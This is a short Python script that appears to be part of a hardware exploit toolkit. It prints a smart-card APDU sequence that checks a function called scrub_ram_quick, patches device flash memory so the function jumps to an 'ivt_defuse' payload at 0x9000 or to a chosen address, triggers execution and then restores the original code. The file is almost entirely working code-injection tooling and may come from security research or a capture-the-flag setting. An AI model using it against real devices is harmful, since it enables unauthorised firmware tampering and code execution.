#!/usr/bin/env python3
import argparse
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
import generate_pf as gp

gp.CHUNK = 0xFF

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "..", "build", "ivt_defuse.bin")
ADDR = 0x9000


def emit(lines, apdus):
    for ap in apdus:
        lines += [">" + gp.fmt(ap), "<90 00"]


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--jump-to", type=lambda s: int(s, 0),
                   help="patch scrub_ram_quick to jump to this address instead of loading "
                        "the ivt_defuse payload at 0x9000 (target must already hold code)")
    args = p.parse_args()
    target = ADDR if args.jump_to is None else args.jump_to

    off = gp.PATCH_ADDR & 0xFFFF
    lines = [":Verifying patch site holds original body", ""]
    lines += [">" + gp.fmt([0x00, 0x50, 0x00, 0x00, 0x00]), "<90 00"]
    lines += [">" + gp.fmt([0x00, 0x5A, (off >> 8) & 0xFF, off & 0xFF, len(gp.ORIG_PATCH)]),
              "<" + gp.fmt(gp.ORIG_PATCH) + " 90 00"]

    lines += ["", ":Patching flash memory and running", ""]
    emit(lines, gp.inject_apdus(gp.PATCH_ADDR, gp.jump_patch(target)))
    if args.jump_to is None:
        emit(lines, gp.inject_apdus(ADDR, open(BIN, "rb").read()))
    lines += [">" + gp.fmt(gp.TRIGGER), "<90 00"]

    lines += ["", ":Restoring original scrub_ram_quick body", ""]
    emit(lines, gp.inject_apdus(gp.PATCH_ADDR, gp.ORIG_PATCH))

    sys.stdout.write("\n".join(lines) + "\n")


if __name__ == "__main__":
    main()
